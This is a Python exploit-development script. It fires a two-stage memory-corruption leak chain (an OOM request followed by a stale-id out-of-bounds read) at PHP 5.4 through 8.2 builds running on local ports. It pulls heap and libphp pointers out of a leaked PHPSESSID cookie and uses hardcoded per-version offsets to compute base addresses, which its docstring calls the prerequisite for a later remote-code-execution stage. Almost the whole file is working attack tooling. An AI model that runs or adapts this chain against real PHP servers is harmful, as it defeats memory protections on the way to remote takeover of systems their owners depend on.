#!/usr/bin/env python3
"""Probe ALL unproven versions with the 9bie A1+B1 (stale-id OOB read) leak.

For each version, run the A1 OOM + B1 leak once and report whether a heap
pointer window appears (i.e. whether the version is 'reachable' by this leak).
This is the critical filter: a version must leak a chunk base + libphp base
before any stage-3 RCE is possible.

Offsets (zif/dtor) from the per-version offsets memory.
"""
import sys, os, time, subprocess, struct, urllib.parse
from collections import Counter

GH = r"C:\Users\likat\.qwen\tmp\p2s"
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
MAIN_BUCKET_COUNT = 87

# (label, port, zif, dtor)
VERSIONS = [
    ("5.4.45", 18101, 0x2f2e20, 0x3cd750),
    ("5.5.38", 18102, 0x357e70, 0x438b80),
    ("5.6.40", 18103, 0x378e80, 0x466920),
    ("7.0.33", 18104, 0x3948d0, 0x47b7b0),
    ("7.1.33", 18105, 0x300420, 0x3e6f60),
    ("7.2.34", 18106, 0x3624e0, 0x451010),
    ("7.3.33", 18107, 0x35f640, 0x440dc0),
    ("7.4.33", 18108, 0x335850, 0x417d60),
    ("8.0.30", 18109, 0x3495d0, 0x4319a0),
    ("8.1.32", 18110, 0x36b080, 0x450690),
    ("8.2.34", 18111, 0x39b8a0, 0x487650),
]


def send(body_file, port, path, save, timeout=120):
    cmd = [sys.executable, os.path.join(GH, "gh_pure_chunked_send.py"),
           "--port", str(port), "--body-file", body_file, "--path", path,
           "--timeout", str(timeout), "--save-response", save]
    subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)


def parse(resp, dtor, zif):
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        return None
    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    ptr_max = 0x7FFFFFFFFFFF
    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= ptr_max:
            counts[q] += 1
    if not counts:
        return None
    zdtor, _ = counts.most_common(1)[0]
    lib = zdtor - dtor
    buckets = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common() if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))
    return dict(decoded=len(dec), zdtor=zdtor, lib=lib,
                main=[b for b, c in cands[:3]], zif=lib + zif)


def main():
    a1 = os.path.join(GH, "a1_test.bin")
    b1 = os.path.join(GH, "b1_test.bin")
    leak = os.path.join(GH, "leak_test.resp")
    subprocess.run([sys.executable, os.path.join(GH, "gh_pure_mk_a1.py"),
                    "--out", a1, "--big", "78"], capture_output=True, text=True, timeout=60)
    subprocess.run([sys.executable, os.path.join(GH, "gh_pure_mk_leak_b.py"),
                    "--out", b1, "--spec", LEAK_SPEC, "--fake-len", "0xC8000", "--tag"],
                   capture_output=True, text=True, timeout=60)

    results = []
    for ver, port, zif, dtor in VERSIONS:
        # warm the worker
        try:
            import socket
            s = socket.create_connection(("127.0.0.1", port), timeout=5)
            s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
            s.recv(1024); s.close()
        except OSError:
            pass
        ok = False
        info = None
        for t in range(2):
            send(a1, port, "/index.php?q1=1", leak, timeout=180)
            time.sleep(0.2)
            send(b1, port, "/index.php", leak, timeout=180)
            try:
                info = parse(open(leak, "rb").read(), dtor, zif)
                if info and info["main"]:
                    ok = True
                    break
            except Exception:
                pass
        if ok:
            delta = info["lib"] - info["main"][0]
            print(f"[{ver}] port={port} LEAK OK  main={info['main'][:2]} "
                  f"lib=0x{info['lib']:x} zif=0x{info['zif']:x} delta=0x{delta:x} "
                  f"decoded={info['decoded']}", flush=True)
        else:
            print(f"[{ver}] port={port} leak FAILED (no heap window)", flush=True)
        results.append((ver, ok))
    print("\n=== SUMMARY ===")
    for ver, ok in results:
        print(f"  {ver}: {'REACHABLE' if ok else 'blocked'}", flush=True)


if __name__ == "__main__":
    main()
